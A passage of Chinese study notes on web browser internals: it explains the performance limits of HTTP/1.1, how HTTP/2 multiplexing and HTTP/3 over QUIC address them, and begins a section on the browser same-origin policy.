HTTP&#x2F;1.0 中引入了请求头和响应头。在支持多种类型文件下载的基础之上，HTTP&#x2F;1.0 还提供了 Cache 机制、用户代理、状态码等一些基础信息。</p><p>但随着技术和需求的发展，人们对文件传输的速度要求越来越高，故又基于 HTTP&#x2F;1.0 推出了 HTTP&#x2F;1.1，增加了持久连接方法来提升连接效率，同时还尝试使用管线化技术提升效率（不过由于各种原因，管线化技术最终被各大厂商放弃了）。除此之外，HTTP&#x2F;1.1 还引入了 Cookie、虚拟主机的支持、对动态内容的支持等特性。</p><p>虽然 HTTP&#x2F;1.1 在 HTTP&#x2F;1.0 的基础之上做了大量的优化，但是由于一些效率问题始终很难解决，所以最终还是被 HTTP&#x2F;2 所取代，这就是我们下一篇文章要介绍的内容了。</p><h2 id="2-HTTP-x2F-2：如何提升网络速度？"><a href="#2-HTTP-x2F-2：如何提升网络速度？" class="headerlink" title="2. HTTP&#x2F;2：如何提升网络速度？"></a>2. HTTP&#x2F;2：如何提升网络速度？</h2><p><a href="https://time.geekbang.org/column/article/147501">上一篇文章</a>我们聊了 HTTP&#x2F;1.1 的发展史，虽然 HTTP&#x2F;1.1 已经做了大量的优化，但是依然存在很多性能瓶颈，依然不能满足我们日益变化的新需求，所以就有了我们今天要聊的 HTTP&#x2F;2。</p><p>本文我们依然从需求的层面来谈，先分析 HTTP&#x2F;1.1 存在哪些问题，然后再来分析 HTTP&#x2F;2 是如何解决这些问题的。</p><p>我们知道 HTTP&#x2F;1.1 为网络效率做了大量的优化，最核心的有如下三种方式：</p><ol><li>增加了持久连接；</li><li>浏览器为每个域名最多同时维护 6 个 TCP 持久连接；</li><li>使用 CDN 的实现域名分片机制。</li></ol><p>通过这些方式就大大提高了页面的下载速度，你可以通过下图来直观感受下：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223427264.png" alt="image-20221014223427264"></p><p>在该图中，引入了 CDN，并同时为每个域名维护 6 个连接，这样就大大减轻了整个资源的下载时间。这里我们可以简单计算下：如果使用单个 TCP 的持久连接，下载 100 个资源所花费的时间为 100 _ n _ RTT；若通过上面的技术，就可以把整个时间缩短为 100 _ n _ RTT&#x2F;(6 * CDN 个数)。从这个计算结果来看，我们的页面加载速度变快了不少。</p><h3 id="HTTP-x2F-1-1-的主要问题"><a href="#HTTP-x2F-1-1-的主要问题" class="headerlink" title="HTTP&#x2F;1.1 的主要问题"></a>HTTP&#x2F;1.1 的主要问题</h3><p>虽然 HTTP&#x2F;1.1 采取了很多优化资源加载速度的策略，也取得了一定的效果，但是 HTTP&#x2F;1.1<strong>对带宽的利用率却并不理想</strong>，这也是 HTTP&#x2F;1.1 的一个核心问题。</p><p><strong>带宽是指每秒最大能发送或者接收的字节数</strong>。我们把每秒能发送的最大字节数称为<strong>上行带宽</strong>，每秒能够接收的最大字节数称为<strong>下行带宽</strong>。</p><p>之所以说 HTTP&#x2F;1.1 对带宽的利用率不理想，是因为 HTTP&#x2F;1.1 很难将带宽用满。比如我们常说的 100M 带宽，实际的下载速度能达到 12.5M&#x2F;S，而采用 HTTP&#x2F;1.1 时，也许在加载页面资源时最大只能使用到 2.5M&#x2F;S，很难将 12.5M 全部用满。</p><p>之所以会出现这个问题，主要是由以下三个原因导致的。</p><p><strong>第一个原因，TCP 的慢启动。</strong></p><p>一旦一个 TCP 连接建立之后，就进入了发送数据状态，刚开始 TCP 协议会采用一个非常慢的速度去发送数据，然后慢慢加快发送数据的速度，直到发送数据的速度达到一个理想状态，我们把这个过程称为慢启动。</p><p>你可以把每个 TCP 发送数据的过程看成是一辆车的启动过程，当刚进入公路时，会有从 0 到一个稳定速度的提速过程，TCP 的慢启动就类似于该过程。</p><p>慢启动是 TCP 为了减少网络拥塞的一种策略，我们是没有办法改变的。</p><p>而之所以说慢启动会带来性能问题，是因为页面中常用的一些关键资源文件本来就不大，如 HTML 文件、CSS 文件和 JavaScript 文件，通常这些文件在 TCP 连接建立好之后就要发起请求的，但这个过程是慢启动，所以耗费的时间比正常的时间要多很多，这样就推迟了宝贵的首次渲染页面的时长了。</p><p><strong>第二个原因，同时开启了多条 TCP 连接，那么这些连接会竞争固定的带宽。</strong></p><p>你可以想象一下，系统同时建立了多条 TCP 连接，当带宽充足时，每条连接发送或者接收速度会慢慢向上增加；而一旦带宽不足时，这些 TCP 连接又会减慢发送或者接收的速度。比如一个页面有 200 个文件，使用了 3 个 CDN，那么加载该网页的时候就需要建立 6 * 3，也就是 18 个 TCP 连接来下载资源；在下载过程中，当发现带宽不足的时候，各个 TCP 连接就需要动态减慢接收数据的速度。</p><p>这样就会出现一个问题，因为有的 TCP 连接下载的是一些关键资源，如 CSS 文件、JavaScript 文件等，而有的 TCP 连接下载的是图片、视频等普通的资源文件，但是多条 TCP 连接之间又不能协商让哪些关键资源优先下载，这样就有可能影响那些关键资源的下载速度了。</p><p><strong>第三个原因，HTTP&#x2F;1.1 队头阻塞的问题。</strong></p><p>通过<a href="https://time.geekbang.org/column/article/147501">上一篇文章</a>，我们知道在 HTTP&#x2F;1.1 中使用持久连接时，虽然能公用一个 TCP 管道，但是在一个管道中同一时刻只能处理一个请求，在当前的请求没有结束之前，其他的请求只能处于阻塞状态。这意味着我们不能随意在一个管道中发送请求和接收内容。</p><p>这是一个很严重的问题，因为阻塞请求的因素有很多，并且都是一些不确定性的因素，假如有的请求被阻塞了 5 秒，那么后续排队的请求都要延迟等待 5 秒，在这个等待的过程中，带宽、CPU 都被白白浪费了。</p><p>在浏览器处理生成页面的过程中，是非常希望能提前接收到数据的，这样就可以对这些数据做预处理操作，比如提前接收到了图片，那么就可以提前进行编解码操作，等到需要使用该图片的时候，就可以直接给出处理后的数据了，这样能让用户感受到整体速度的提升。</p><p>但队头阻塞使得这些数据不能并行请求，所以队头阻塞是很不利于浏览器优化的。</p><h3 id="HTTP-x2F-2-的多路复用"><a href="#HTTP-x2F-2-的多路复用" class="headerlink" title="HTTP&#x2F;2 的多路复用"></a>HTTP&#x2F;2 的多路复用</h3><p>前面我们分析了 HTTP&#x2F;1.1 所存在的一些主要问题：慢启动和 TCP 连接之间相互竞争带宽是由于 TCP 本身的机制导致的，而队头阻塞是由于 HTTP&#x2F;1.1 的机制导致的。</p><p>那么该如何去解决这些问题呢？</p><p>虽然 TCP 有问题，但是我们依然没有换掉 TCP 的能力，所以我们就要想办法去规避 TCP 的慢启动和 TCP 连接之间的竞争问题。</p><p>基于此，HTTP&#x2F;2 的思路就是一个域名只使用一个 TCP 长连接来传输数据，这样整个页面资源的下载过程只需要一次慢启动，同时也避免了多个 TCP 连接竞争带宽所带来的问题。</p><p>另外，就是队头阻塞的问题，等待请求完成后才能去请求下一个资源，这种方式无疑是最慢的，所以 HTTP&#x2F;2 需要实现资源的并行请求，也就是任何时候都可以将请求发送给服务器，而并不需要等待其他请求的完成，然后服务器也可以随时返回处理好的请求资源给浏览器。</p><p>所以，HTTP&#x2F;2 的解决方案可以总结为：<strong>一个域名只使用一个 TCP 长连接和消除队头阻塞问题</strong>。可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223439383.png" alt="image-20221014223439383"></p><p>该图就是 HTTP&#x2F;2 最核心、最重要且最具颠覆性的<strong>多路复用机制</strong>。从图中你会发现每个请求都有一个对应的 ID，如 stream1 表示 index.html 的请求，stream2 表示 foo.css 的请求。这样在浏览器端，就可以随时将请求发送给服务器了。</p><p>服务器端接收到这些请求后，会根据自己的喜好来决定优先返回哪些内容，比如服务器可能早就缓存好了 index.html 和 bar.js 的响应头信息，那么当接收到请求的时候就可以立即把 index.html 和 bar.js 的响应头信息返回给浏览器，然后再将 index.html 和 bar.js 的响应体数据返回给浏览器。之所以可以随意发送，是因为每份数据都有对应的 ID，浏览器接收到之后，会筛选出相同 ID 的内容，将其拼接为完整的 HTTP 响应数据。</p><p>HTTP&#x2F;2 使用了多路复用技术，可以将请求分成一帧一帧的数据去传输，这样带来了一个额外的好处，就是当收到一个优先级高的请求时，比如接收到 JavaScript 或者 CSS 关键资源的请求，服务器可以暂停之前的请求来优先处理关键资源的请求。</p><h3 id="多路复用的实现"><a href="#多路复用的实现" class="headerlink" title="多路复用的实现"></a>多路复用的实现</h3><p>现在我们知道为了解决 HTTP&#x2F;1.1 存在的问题，HTTP&#x2F;2 采用了多路复用机制，那 HTTP&#x2F;2 是怎么实现多路复用的呢？你可以先看下面这张图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223455288.png" alt="image-20221014223455288"></p><p>从图中可以看出，HTTP&#x2F;2 添加了一个<strong>二进制分帧层</strong>，那我们就结合图来分析下 HTTP&#x2F;2 的请求和接收过程。</p><ul><li>首先，浏览器准备好请求数据，包括了请求行、请求头等信息，如果是 POST 方法，那么还要有请求体。</li><li>这些数据经过二进制分帧层处理之后，会被转换为一个个带有请求 ID 编号的帧，通过协议栈将这些帧发送给服务器。</li><li>服务器接收到所有帧之后，会将所有相同 ID 的帧合并为一条完整的请求信息。</li><li>然后服务器处理该条请求，并将处理的响应行、响应头和响应体分别发送至二进制分帧层。</li><li>同样，二进制分帧层会将这些响应数据转换为一个个带有请求 ID 编号的帧，经过协议栈发送给浏览器。</li><li>浏览器接收到响应帧之后，会根据 ID 编号将帧的数据提交给对应的请求。</li></ul><p>从上面的流程可以看出，<strong>通过引入二进制分帧层，就实现了 HTTP 的多路复用技术</strong>。</p><p><a href="https://time.geekbang.org/column/article/147501">上一篇文章</a>我们介绍过，HTTP 是浏览器和服务器通信的语言，在这里虽然 HTTP&#x2F;2 引入了二进制分帧层，不过 HTTP&#x2F;2 的语义和 HTTP&#x2F;1.1 依然是一样的，也就是说它们通信的语言并没有改变，比如开发者依然可以通过 Accept 请求头告诉服务器希望接收到什么类型的文件，依然可以使用 Cookie 来保持登录状态，依然可以使用 Cache 来缓存本地文件，这些都没有变，发生改变的只是传输方式。这一点对开发者来说尤为重要，这意味着我们不需要为 HTTP&#x2F;2 去重建生态，并且 HTTP&#x2F;2 推广起来会也相对更轻松了。</p><h3 id="HTTP-x2F-2-其他特性"><a href="#HTTP-x2F-2-其他特性" class="headerlink" title="HTTP&#x2F;2 其他特性"></a>HTTP&#x2F;2 其他特性</h3><p>通过上面的分析，我们知道了多路复用是 HTTP&#x2F;2 的最核心功能，它能实现资源的并行传输。多路复用技术是建立在二进制分帧层的基础之上。其实基于二进制分帧层，HTTP&#x2F;2 还附带实现了很多其他功能，下面我们就来简要了解下。</p><h4 id="1-可以设置请求的优先级"><a href="#1-可以设置请求的优先级" class="headerlink" title="1. 可以设置请求的优先级"></a>1. 可以设置请求的优先级</h4><p>我们知道浏览器中有些数据是非常重要的，但是在发送请求时，重要的请求可能会晚于那些不怎么重要的请求，如果服务器按照请求的顺序来回复数据，那么这个重要的数据就有可能推迟很久才能送达浏览器，这对于用户体验来说是非常不友好的。</p><p>为了解决这个问题，HTTP&#x2F;2 提供了请求优先级，可以在发送请求时，标上该请求的优先级，这样服务器接收到请求之后，会优先处理优先级高的请求。</p><h4 id="2-服务器推送"><a href="#2-服务器推送" class="headerlink" title="2. 服务器推送"></a>2. 服务器推送</h4><p>除了设置请求的优先级外，HTTP&#x2F;2 还可以直接将数据提前推送到浏览器。你可以想象这样一个场景，当用户请求一个 HTML 页面之后，服务器知道该 HTML 页面会引用几个重要的 JavaScript 文件和 CSS 文件，那么在接收到 HTML 请求之后，附带将要使用的 CSS 文件和 JavaScript 文件一并发送给浏览器，这样当浏览器解析完 HTML 文件之后，就能直接拿到需要的 CSS 文件和 JavaScript 文件，这对首次打开页面的速度起到了至关重要的作用。</p><h4 id="3-头部压缩"><a href="#3-头部压缩" class="headerlink" title="3. 头部压缩"></a>3. 头部压缩</h4><p>无论是 HTTP&#x2F;1.1 还是 HTTP&#x2F;2，它们都有请求头和响应头，这是浏览器和服务器的通信语言。HTTP&#x2F;2 对请求头和响应头进行了压缩，你可能觉得一个 HTTP 的头文件没有多大，压不压缩可能关系不大，但你这样想一下，在浏览器发送请求的时候，基本上都是发送 HTTP 请求头，很少有请求体的发送，通常情况下页面也有 100 个左右的资源，如果将这 100 个请求头的数据压缩为原来的 20%，那么传输效率肯定能得到大幅提升。</p><h3 id="总结-29"><a href="#总结-29" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就介绍这里，下面我来总结下本文的主要内容。</p><p>我们首先分析了影响 HTTP&#x2F;1.1 效率的三个主要因素：TCP 的慢启动、多条 TCP 连接竞争带宽和队头阻塞。</p><p>接下来我们分析了 HTTP&#x2F;2 是如何采用多路复用机制来解决这些问题的。多路复用是通过在协议栈中添加二进制分帧层来实现的，有了二进制分帧层还能够实现请求的优先级、服务器推送、头部压缩等特性，从而大大提升了文件传输效率。</p><p>HTTP&#x2F;2 协议规范于 2015 年 5 月正式发布，在那之后，该协议已在互联网和万维网上得到了广泛的实现和部署。从目前的情况来看，国内外一些排名靠前的站点基本都实现了 HTTP&#x2F;2 的部署。使用 HTTP&#x2F;2 能带来 20%～ 60% 的效率提升，至于 20% 还是 60% 要看优化的程度。总之，我们也应该与时俱进，放弃 HTTP&#x2F;1.1 和其性能优化方法，去“拥抱”HTTP&#x2F;2。</p><h2 id="3-HTTP-x2F-3：甩掉-TCP、TLS-的包袱，构建高效网络"><a href="#3-HTTP-x2F-3：甩掉-TCP、TLS-的包袱，构建高效网络" class="headerlink" title="3. HTTP&#x2F;3：甩掉 TCP、TLS 的包袱，构建高效网络"></a>3. HTTP&#x2F;3：甩掉 TCP、TLS 的包袱，构建高效网络</h2><p>前面两篇文章我们分析了 HTTP&#x2F;1 和 HTTP&#x2F;2，在 HTTP&#x2F;2 出现之前，开发者需要采取很多变通的方式来解决 HTTP&#x2F;1 所存在的问题，不过 HTTP&#x2F;2 在 2018 年就开始得到了大规模的应用，HTTP&#x2F;1 中存在的一大堆缺陷都得到了解决。</p><p>HTTP&#x2F;2 的一个核心特性是使用了多路复用技术，因此它可以通过一个 TCP 连接来发送多个 URL 请求。多路复用技术能充分利用带宽，最大限度规避了 TCP 的慢启动所带来的问题，同时还实现了头部压缩、服务器推送等功能，使得页面资源的传输速度得到了大幅提升。在 HTTP&#x2F;1.1 时代，为了提升并行下载效率，浏览器为每个域名维护了 6 个 TCP 连接；而采用 HTTP&#x2F;2 之后，浏览器只需要为每个域名维护 1 个 TCP 持久连接，同时还解决了 HTTP&#x2F;1.1 队头阻塞的问题。</p><p>从目前的情况来看，HTTP&#x2F;2 似乎可以完美取代 HTTP&#x2F;1 了，不过 HTTP&#x2F;2 依然存在一些缺陷，于是就有了 HTTP&#x2F;3。和通常一样，介绍 HTTP&#x2F;3 之前，我们先来看看 HTTP&#x2F;2 到底有什么缺陷。</p><h3 id="TCP-的队头阻塞"><a href="#TCP-的队头阻塞" class="headerlink" title="TCP 的队头阻塞"></a>TCP 的队头阻塞</h3><p>虽然 HTTP&#x2F;2 解决了应用层面的队头阻塞问题，不过和 HTTP&#x2F;1.1 一样，HTTP&#x2F;2 依然是基于 TCP 协议的，而 TCP 最初就是为了单连接而设计的。你可以把 TCP 连接看成是两台计算机之前的一个虚拟管道，计算机的一端将要传输的数据按照顺序放入管道，最终数据会以相同的顺序出现在管道的另外一头。</p><p>接下来我们就来分析下 HTTP&#x2F;1.1 协议栈中 TCP 是如何传输数据的。为直观理解，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223521338.png" alt="image-20221014223521338"></p><p>通过上图你会发现，从一端发送给另外一端的数据会被拆分为一个个按照顺序排列的数据包，这些数据包通过网络传输到了接收端，接收端再按照顺序将这些数据包组合成原始数据，这样就完成了数据传输。</p><p>不过，如果在数据传输的过程中，有一个数据因为网络故障或者其他原因而丢包了，那么整个 TCP 的连接就会处于暂停状态，需要等待丢失的数据包被重新传输过来。你可以把 TCP 连接看成是一个按照顺序传输数据的管道，管道中的任意一个数据丢失了，那之后的数据都需要等待该数据的重新传输。为了直观理解，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223531857.png" alt="image-20221014223531857"></p><p>我们就把<strong>在 TCP 传输过程中，由于单个数据包的丢失而造成的阻塞称为 TCP 上的队头阻塞</strong>。</p><p>那队头阻塞是怎么影响 HTTP&#x2F;2 传输的呢？首先我们来看正常情况下 HTTP&#x2F;2 是怎么传输多路请求的，为了直观理解，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223544797.png" alt="image-20221014223544797"></p><p>通过该图，我们知道在 HTTP&#x2F;2 中，多个请求是跑在一个 TCP 管道中的，如果其中任意一路数据流中出现了丢包的情况，那么就会阻塞该 TCP 连接中的所有请求。这不同于 HTTP&#x2F;1.1，使用 HTTP&#x2F;1.1 时，浏览器为每个域名开启了 6 个 TCP 连接，如果其中的 1 个 TCP 连接发生了队头阻塞，那么其他的 5 个连接依然可以继续传输数据。</p><p>所以随着丢包率的增加，HTTP&#x2F;2 的传输效率也会越来越差。有测试数据表明，当系统达到了 2% 的丢包率时，HTTP&#x2F;1.1 的传输效率反而比 HTTP&#x2F;2 表现得更好。</p><h3 id="TCP-建立连接的延时"><a href="#TCP-建立连接的延时" class="headerlink" title="TCP 建立连接的延时"></a>TCP 建立连接的延时</h3><p>除了 TCP 队头阻塞之外，TCP 的握手过程也是影响传输效率的一个重要因素。</p><p>为了搞清楚 TCP 协议建立连接的延迟问题，我们还是先来回顾下网络延迟的概念，这会有助于你对后面内容的理解。网络延迟又称为 RTT（Round Trip Time）。我们把从浏览器发送一个数据包到服务器，再从服务器返回数据包到浏览器的整个往返时间称为 RTT（如下图）。RTT 是反映网络性能的一个重要指标。<img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223553137.png" alt="image-20221014223553137"></p><p>那建立 TCP 连接时，需要花费多少个 RTT 呢？下面我们来计算下。</p><p>我们知道 HTTP&#x2F;1 和 HTTP&#x2F;2 都是使用 TCP 协议来传输的，而如果使用 HTTPS 的话，还需要使用 TLS 协议进行安全传输，而使用 TLS 也需要一个握手过程，这样就需要有两个握手延迟过程。</p><ol><li>在建立 TCP 连接的时候，需要和服务器进行三次握手来确认连接成功，也就是说需要在消耗完 1.5 个 RTT 之后才能进行数据传输。</li><li>进行 TLS 连接，TLS 有两个版本——TLS1.2 和 TLS1.3，每个版本建立连接所花的时间不同，大致是需要 1 ～ 2 个 RTT，关于 HTTPS 我们到后面到安全模块再做详细介绍。</li></ol><p>总之，在传输数据之前，我们需要花掉 3 ～ 4 个 RTT。如果浏览器和服务器的物理距离较近，那么 1 个 RTT 的时间可能在 10 毫秒以内，也就是说总共要消耗掉 30 ～ 40 毫秒。这个时间也许用户还可以接受，但如果服务器相隔较远，那么 1 个 RTT 就可能需要 100 毫秒以上了，这种情况下整个握手过程需要 300 ～ 400 毫秒，这时用户就能明显地感受到“慢”了。</p><h3 id="TCP-协议僵化"><a href="#TCP-协议僵化" class="headerlink" title="TCP 协议僵化"></a>TCP 协议僵化</h3><p>现在我们知道了 TCP 协议存在队头阻塞和建立连接延迟等缺点，那我们是不是可以通过改进 TCP 协议来解决这些问题呢？</p><p>答案是：<strong>非常困难</strong>。之所以这样，主要有两个原因。</p><p>第一个是<strong>中间设备的僵化</strong>。要搞清楚什么是中间设备僵化，我们先要弄明白什么是中间设备。我们知道互联网是由多个网络互联的网状结构，为了能够保障互联网的正常工作，我们需要在互联网的各处搭建各种设备，这些设备就被称为中间设备。</p><p>这些中间设备有很多种类型，并且每种设备都有自己的目的，这些设备包括了路由器、防火墙、NAT、交换机等。它们通常依赖一些很少升级的软件，这些软件使用了大量的 TCP 特性，这些功能被设置之后就很少更新了。</p><p>所以，如果我们在客户端升级了 TCP 协议，但是当新协议的数据包经过这些中间设备时，它们可能不理解包的内容，于是这些数据就会被丢弃掉。这就是中间设备僵化，它是阻碍 TCP 更新的一大障碍。</p><p>除了中间设备僵化外，<strong>操作系统也是导致 TCP 协议僵化的另外一个原因</strong>。因为 TCP 协议都是通过操作系统内核来实现的，应用程序只能使用不能修改。通常操作系统的更新都滞后于软件的更新，因此要想自由地更新内核中的 TCP 协议也是非常困难的。</p><h3 id="QUIC-协议"><a href="#QUIC-协议" class="headerlink" title="QUIC 协议"></a>QUIC 协议</h3><p>HTTP&#x2F;2 存在一些比较严重的与 TCP 协议相关的缺陷，但由于 TCP 协议僵化，我们几乎不可能通过修改 TCP 协议自身来解决这些问题，那么解决问题的思路是绕过 TCP 协议，发明一个 TCP 和 UDP 之外的新的传输协议。但是这也面临着和修改 TCP 一样的挑战，因为中间设备的僵化，这些设备只认 TCP 和 UDP，如果采用了新的协议，新协议在这些设备同样不被很好地支持。</p><p>因此，HTTP&#x2F;3 选择了一个折衷的方法——UDP 协议，基于 UDP 实现了类似于 TCP 的多路数据流、传输可靠性等功能，我们把这套功能称为<strong>QUIC 协议</strong>。关于 HTTP&#x2F;2 和 HTTP&#x2F;3 协议栈的比较，你可以参考下图：<img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223607237.png" alt="image-20221014223607237"></p><p>通过上图我们可以看出，HTTP&#x2F;3 中的 QUIC 协议集合了以下几点功能。</p><ul><li><p><strong>实现了类似 TCP 的流量控制、传输可靠性的功能</strong>。虽然 UDP 不提供可靠性的传输，但 QUIC 在 UDP 的基础之上增加了一层来保证数据可靠性传输。它提供了数据包重传、拥塞控制以及其他一些 TCP 中存在的特性。</p></li><li><p><strong>集成了 TLS 加密功能</strong>。目前 QUIC 使用的是 TLS1.3，相较于早期版本 TLS1.3 有更多的优点，其中最重要的一点是减少了握手所花费的 RTT 个数。</p></li><li><p><strong>实现了 HTTP&#x2F;2 中的多路复用功能</strong>。和 TCP 不同，QUIC 实现了在同一物理连接上可以有多个独立的逻辑数据流（如下图）。实现了数据流的单独传输，就解决了 TCP 中队头阻塞的问题。<img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223617100.png" alt="image-20221014223617100"></p></li><li><p><strong>实现了快速握手功能</strong>。由于 QUIC 是基于 UDP 的，所以 QUIC 可以实现使用 0-RTT 或者 1-RTT 来建立连接，这意味着 QUIC 可以用最快的速度来发送和接收数据，这样可以大大提升首次打开页面的速度。</p></li></ul><h3 id="HTTP-x2F-3-的挑战"><a href="#HTTP-x2F-3-的挑战" class="headerlink" title="HTTP&#x2F;3 的挑战"></a>HTTP&#x2F;3 的挑战</h3><p>通过上面的分析，我们相信在技术层面，HTTP&#x2F;3 是个完美的协议。不过要将 HTTP&#x2F;3 应用到实际环境中依然面临着诸多严峻的挑战，这些挑战主要来自于以下三个方面。</p><p>第一，从目前的情况来看，服务器和浏览器端都没有对 HTTP&#x2F;3 提供比较完整的支持。Chrome 虽然在数年前就开始支持 Google 版本的 QUIC，但是这个版本的 QUIC 和官方的 QUIC 存在着非常大的差异。</p><p>第二，部署 HTTP&#x2F;3 也存在着非常大的问题。因为系统内核对 UDP 的优化远远没有达到 TCP 的优化程度，这也是阻碍 QUIC 的一个重要原因。</p><p>第三，中间设备僵化的问题。这些设备对 UDP 的优化程度远远低于 TCP，据统计使用 QUIC 协议时，大约有 3%～ 7% 的丢包率。</p><h3 id="总结-30"><a href="#总结-30" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p><p>我们首先分析了 HTTP&#x2F;2 中所存在的一些问题，主要包括了 TCP 的队头阻塞、建立 TCP 连接的延时、TCP 协议僵化等问题。</p><p>这些问题都是 TCP 的内部问题，因此要解决这些问题就要优化 TCP 或者“另起炉灶”创造新的协议。由于优化 TCP 协议存在着诸多挑战，所以官方选择了创建新的 QUIC 协议。</p><p>HTTP&#x2F;3 正是基于 QUIC 协议的，你可以把 QUIC 看成是集成了“TCP+HTTP&#x2F;2 的多路复用 +TLS 等功能”的一套协议。这是集众家所长的一个协议，从协议最底层对 Web 的文件传输做了比较彻底的优化，所以等生态相对成熟时，可以用来打造比现在的 HTTP&#x2F;2 还更加高效的网络。</p><p>虽说这套协议解决了 HTTP&#x2F;2 中因 TCP 而带来的问题，不过由于是改动了底层协议，所以推广起来还会面临着巨大的挑战。</p><p>关于 HTTP&#x2F;3 的未来，我有下面两点判断：</p><ol><li>从标准制定到实践再到协议优化还需要走很长一段路；</li><li>因为动了底层协议，所以 HTTP&#x2F;3 的增长会比较缓慢，这和 HTTP&#x2F;2 有着本质的区别。</li></ol><h1 id="七、浏览器安全"><a href="#七、浏览器安全" class="headerlink" title="七、浏览器安全"></a>七、浏览器安全</h1><h2 id="1-同源策略：为什么-XMLHttpRequest-不能跨域请求资源？"><a href="#1-同源策略：为什么-XMLHttpRequest-不能跨域请求资源？" class="headerlink" title="1. 同源策略：为什么 XMLHttpRequest 不能跨域请求资源？"></a>1. 同源策略：为什么 XMLHttpRequest 不能跨域请求资源？</h2><p>通过前面 6 个模块的介绍，我们已经大致知道浏览器是怎么工作的了，也了解这种工作方式对前端产生了什么样的影响。在这个过程中，我们还穿插介绍了一些浏览器安全相关的内容，不过都比较散，所以最后的 5 篇文章，我们就来系统地介绍下浏览器安全相关的内容。</p><p>浏览器安全可以分为三大块——<strong>Web 页面安全、浏览器网络安全</strong>和<strong>浏览器系统安全</strong>，所以本模块我们就按照这个思路来做介绍。鉴于页面安全的重要性，我们会用三篇文章来介绍该部分的知识；网络安全和系统安全则分别用一篇来介绍。</p><p>今天我们就先来分析页面中的安全策略，不过在开始之前，我们先来做个假设，如果页面中没有安全策略的话，Web 世界会是什么样子的呢？</p><p>Web 世界会是开放的，任何资源都可以接入其中，我们的网站可以加载并执行别人网站的脚本文件、图片、音频 &#x2F; 视频等资源，甚至可以下载其他站点的可执行文件。</p><p>Web 世界是开放的，这很符合 Web 理念。但如果 Web 世界是绝对自由的，那么页面行为将没有任何限制，这会造成无序或者混沌的局面，出现很多不可控的问题。</p><p>比如你打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情：</p><ul><li>修改银行站点的 DOM、CSSOM 等信息；</li><li>在银行站点内部插入 JavaScript 脚本；</li><li>劫持用户登录的用户名和密码；</li><li>读取银行站点的 Cookie、IndexDB 等数据；</li><li>甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。</li></ul><p>所以说，<strong>在没有安全保障的 Web 世界中，我们是没有隐私的，因此需要安全策略来保障我们的隐私和数据的安全</strong>。</p><p>这就引出了页面中最基础、最核心的安全策略：<strong>同源策略（Same-origin policy）</strong>。</p><h3 id="什么是同源策略"><a href="#什么是同源策略" class="headerlink" title="什么是同源策略"></a>什么是同源策略</h3><p>要了解什么是同源策略，我们得先来看看什么是同源。</p><p><strong>如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源</strong>。比如下面这两个 URL，它们具有相同的协议 HTTPS、相同的域名 time.geekbang.org，以及相同的端口 443，所以我们就说这两个 URL 是同源的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://time.geekbang.org/?category=1</span><br><span class="line">https://time.geekbang.org/?category=0</span><br></pre></td></tr></table></figure><p>浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，那么会有一套基础的安全策略的制约，我们把这称为同源策略。</p><p>具体来讲，同源策略主要表现在 DOM、Web 数据和网络这三个层面。</p><p><strong>第一个，DOM 层面</strong>。同源策略限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</p><p>这里我们还是拿极客时间的官网做例子，打开极客时间的官网，然后再从官网中打开另外一个专栏页面，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014224033775.png" alt="image-20221014224033775"></p><p>由于第一个页面和第二个页面是同源关系，所以我们可以在第二个页面中操作第一个页面的 DOM，比如将第一个页面全部隐藏掉，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">let pdom = opener.document</span><br><span class="line">pdom.body.style.display = &quot;none&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该代码中，对象 opener 就是指向第一个页面的 window 对象，我们可以通过操作 opener 来控制第一个页面中的 DOM。</p><p>我们在第二个页面的控制台中执行上面那段代码，就成功地操作了第一个页面中的 DOM，将页面隐藏了，如下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014224043957.png" alt="image-20221014224043957"></p><p>不过如果打开的第二个页面和第一个页面不是同源的，那么它们就无法相互操作 DOM 了。比如从极客时间官网打开 InfoQ 的页面（由于它们的域名不同，所以不是同源的），然后我们还按照前面同样的步骤来操作，最终操作结果如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014224052592.png" alt="image-20221014224052592"></p><p>从图中可以看出，当我们在 InfoQ 的页面中访问极客时间页面中的 DOM 时，页面抛出了如下的异常信息，这就是同源策略所发挥的作用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Blocked a frame with origin &quot;https://www.infoq.cn&quot; from accessing a cross-origin frame.</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>第二个，数据层面</strong>。同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。你可以自己试一下，这里我们就不做演示了。</p><p><strong>第三个，网络层面</strong>。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。你还记得在<a href="https://time.geekbang.org/column/article/135127">《17 | WebAPI：XMLHttpRequest 是怎么实现的？》</a>这篇文章的末尾分析的 XMLHttpRequest 